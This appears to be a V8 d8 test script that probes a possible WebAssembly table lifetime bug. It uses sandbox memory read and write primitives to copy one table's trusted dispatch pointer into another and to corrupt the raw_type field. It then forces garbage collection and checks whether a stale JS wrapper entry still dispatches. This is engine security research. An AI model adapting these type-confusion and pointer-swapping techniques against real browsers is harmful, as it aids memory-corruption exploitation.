// C21 H30: hidden JS wrapper dispatch after donor refs are dropped and GC runs.
//
// Extends H28 with lifetime pressure. The hidden dispatch entry should keep the
// WasmImportData/callable alive. If it becomes stale, tier-up/call may crash or
// misroute.

d8.file.execute('test/mjsunit/wasm/wasm-module-builder.js');

const kWeakHeapObjectTag = 3;
const kHeapObjectTag = 1;
const kTrustedDispatchTableOffset = 0x1c;
const kWasmTableObjectType =
    Sandbox.getInstanceTypeIdFor('WASM_TABLE_OBJECT_TYPE');
const kRawTypeOffset = Sandbox.getFieldOffset(kWasmTableObjectType, 'raw_type');
const memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

function addrof(obj) {
  return Sandbox.getAddressOf(obj) & ~kWeakHeapObjectTag;
}

function tagged(obj) {
  return Sandbox.getAddressOf(obj) + kHeapObjectTag;
}

function read32(addr) {
  return memory.getUint32(addr, true);
}

function write32(addr, val) {
  memory.setUint32(addr, val, true);
}

function rawTypeField(table) {
  return memory.getUint32(tagged(table) + kRawTypeOffset - kHeapObjectTag, true);
}

function corruptRawType(table, rawTypeSmi) {
  Sandbox.corruptObjectField(table, 'raw_type', rawTypeSmi);
}

function makeWasmTarget() {
  let b = new WasmModuleBuilder();
  let sig = b.addType(kSig_i_i);
  b.addFunction('f0', sig)
      .addBody([kExprLocalGet, 0, ...wasmI32Const(0x10), kExprI32Add])
      .exportFunc();
  return b.instantiate().exports.f0;
}

function makeCallerInstance(table) {
  let b = new WasmModuleBuilder();
  let sig = b.addType(kSig_i_i);
  let t = b.addImportedTable('imp', 'table', 1, 3, kWasmFuncRef);
  b.addFunction('call', kSig_i_ii)
      .addBody([
        kExprLocalGet, 1,
        kExprLocalGet, 0,
        kExprCallIndirect, sig, t,
      ])
      .exportFunc();
  return b.instantiate({imp: {table}});
}

let externTable = new WebAssembly.Table({element: 'externref', initial: 1});
let externRefRawTypeSmi = rawTypeField(externTable);
let f0 = makeWasmTarget();
let jsCalls = 0;
let jsFunc = new WebAssembly.Function(
    {parameters: ['i32'], results: ['i32']},
    x => {
      jsCalls++;
      return (x + 0x90) | 0;
    });
let weakJsFunc = new WeakRef(jsFunc);

let donor = new WebAssembly.Table({element: 'anyfunc', initial: 2, maximum: 2});
donor.set(0, f0);
donor.set(1, jsFunc);

let victim = new WebAssembly.Table({element: 'anyfunc', initial: 1, maximum: 3});
victim.set(0, f0);
let funcrefRawTypeSmi = rawTypeField(victim);

write32(addrof(victim) + kTrustedDispatchTableOffset,
        read32(addrof(donor) + kTrustedDispatchTableOffset));
corruptRawType(victim, externRefRawTypeSmi);
let marker = {kind: 'hidden-js-wrapper-gc-marker'};
victim.grow(2, marker);
let entry1WasMarker = victim.get(1) === marker;
corruptRawType(victim, funcrefRawTypeSmi);

donor = null;
jsFunc = null;
for (let r = 0; r < 8; r++) {
  gc();
  let junk = [];
  for (let i = 0; i < 20000; i++) junk.push({i, pad: i + 1});
}
gc();

let callerInstance = makeCallerInstance(victim);
let call = callerInstance.exports.call;

print(`entry1_was_marker=${entry1WasMarker}`);
print(`weak_jsfunc_alive=${weakJsFunc.deref() !== undefined}`);
print(`unopt_before=${%CountUnoptimizedWasmToJSWrapper(callerInstance)}`);
print(`call1=${call(1, 5)}`);
print(`js_calls_after1=${jsCalls}`);
print(`unopt_after1=${%CountUnoptimizedWasmToJSWrapper(callerInstance)}`);
print(`call2=${call(1, 6)}`);
print(`js_calls_after2=${jsCalls}`);
print(`unopt_after2=${%CountUnoptimizedWasmToJSWrapper(callerInstance)}`);
